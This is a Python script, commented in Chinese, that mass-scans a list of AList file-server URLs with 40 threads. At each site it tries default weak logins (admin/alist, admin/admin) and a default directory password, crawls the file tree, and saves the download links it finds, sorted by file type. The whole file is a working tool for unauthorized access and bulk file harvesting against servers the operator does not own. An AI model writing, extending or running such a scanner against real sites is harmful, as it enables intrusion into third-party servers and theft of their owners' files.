import requests
import os
import concurrent.futures
from collections import deque
from datetime import datetime
import pytz
import sys

# === 核心参数配置 ===
INPUT_FILE = 'duplicate.txt'
OUTPUT_DIR = 'scan_results'
MAX_THREADS = 40
TIMEOUT = 5
MAX_DEPTH = 3

# 弱口令尝试
WEAK_PASSWORDS = [
    {"username": "admin", "password": "alist"},
    {"username": "admin", "password": "admin"},
]

# === 排除的扩展名黑名单 ===
# 在这里添加你不想要的文件后缀（不需要加点号）
EXCLUDE_EXTS = {
    # 网页杂质
    'js', 'css', 'html', 'json', 'map', 'ico', 'svg',
    # 字体
    'woff', 'woff2', 'ttf', 'otf',
    # 图片
    'png', 'jpg', 'jpeg', 'gif', 'webp',
    # 临时/配置文件
    'tmp', 'ini', 'log', 'bak', 'md', 'txt',
    # 音乐相关
    'lrc', 'lpa', 'ape', 'flac', 'wav', 'mp3',
    # 文档/电子书
    'pdf', 'epub', 'mobi', 'doc', 'docx', 'ppt', 'pptx'
}

def get_auth_token(base_url, session):
    login_url = f"{base_url.rstrip('/')}/api/auth/login"
    for payload in WEAK_PASSWORDS:
        try:
            r = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and r.json().get("code") == 200:
                return r.json().get("data", {}).get("token")
        except:
            continue
    return None

def get_alist_list(base_url, path, token, session):
    api_url = f"{base_url.rstrip('/')}/api/fs/list"
    headers = {"Authorization": token} if token else {}
    # 默认尝试 alist 路径密码，如果站长设置了目录密码
    payload = {"path": path, "password": "alist", "page": 1, "per_page": 0}
    try:
        resp = session.post(api_url, json=payload, headers=headers, timeout=TIMEOUT, verify=False)
        data = resp.json()
        if data.get("code") == 200:
            return data.get("data", {}).get("content", [])
        elif data.get("code") in [401, 500]:
            # 如果带密码失败，尝试无密码访问
            payload["password"] = ""
            resp = session.post(api_url, json=payload, headers=headers, timeout=TIMEOUT, verify=False)
            data = resp.json()
            if data.get("code") == 200:
                return data.get("data", {}).get("content", [])
    except:
        pass
    return []

def process_url(url, session):
    print(f"-> 尝试扫描: {url}", flush=True)
    token = get_auth_token(url, session)
    local_data = []
    queue = deque([("/", 0)])
    visited_paths = {"/"}
    
    try:
        while queue:
            current_path, depth = queue.popleft()
            if depth > MAX_DEPTH:
                continue
                
            items = get_alist_list(url, current_path, token, session)
            if not items:
                continue
                
            for item in items:
                name = item.get('name')
                full_path = f"{current_path.rstrip('/')}/{name}"
                
                if item.get('is_dir'):
                    if full_path not in visited_paths:
                        visited_paths.add(full_path)
                        queue.append((full_path, depth + 1))
                else:
                    # 提取扩展名并过滤
                    _, ext = os.path.splitext(name)
                    ext = ext.lower().replace('.', '') if ext else "no_ext"
                    
                    if ext in EXCLUDE_EXTS:
                        continue
                        
                    download_url = f"{url.rstrip('/')}/d{full_path}"
                    local_data.append((ext, name, download_url))
    except Exception as e:
        print(f"站点 {url} 处理中发生异常: {e}", flush=True)
        
    return local_data

def main():
    print(">>> AList 扫描引擎启动...", flush=True)
    requests.packages.urllib3.disable_warnings()
    
    if not os.path.exists(INPUT_FILE):
        print(f"错误: 找不到输入文件 {INPUT_FILE}", flush=True)
        return

    with open(INPUT_FILE, 'r', encoding='utf-8') as f:
        urls = list(set([line.strip() for line in f if line.strip().startswith('http')]))

    if not urls:
        print("未发现有效 URL，请检查 duplicate.txt", flush=True)
        return

    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

    final_registry = set()
    total = len(urls)
    print(f"=== 准备扫描 {total} 个站点 ===", flush=True)

    # 配置连接池
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=MAX_THREADS, pool_maxsize=MAX_THREADS*2)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        future_to_url = {executor.submit(process_url, url, session): url for url in urls}
        done_count = 0
        for future in concurrent.futures.as_completed(future_to_url):
            done_count += 1
            if done_count % 10 == 0 or done_count == total:
                print(f"进度: {done_count}/{total} 个站点已处理", flush=True)
            try:
                res = future.result()
                if res:
                    for item in res:
                        final_registry.add(item)
            except:
                pass

    # 结果分类保存
    ext_map = {}
    for ext, name, d_url in final_registry:
        if ext not in ext_map:
            ext_map[ext] = []
        ext_map[ext].append(f"{name} | {d_url}")

    # 获取上海时间
    shanghai_tz = pytz.timezone('Asia/Shanghai')
    now_str = datetime.now(shanghai_tz).strftime("%Y-%m-%d %H:%M:%S")

    print(f"--- 正在写入结果到 {OUTPUT_DIR} ---", flush=True)
    for ext, lines in ext_map.items():
        file_path = os.path.join(OUTPUT_DIR, f"{ext}.txt")
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(f"# 扫描更新时间: {now_str}\n")
            f.write(f"# 排除规则: 已过滤常见网页杂质文件及 txt/md\n\n")
            for line in sorted(lines):
                f.write(line + "\n")

    print(f"=== 任务圆满完成! ===", flush=True)
    print(f"共发现文件分类: {len(ext_map)} 类", flush=True)
    print(f"去重后文件总数: {len(final_registry)} 个", flush=True)

if __name__ == "__main__":
    main()
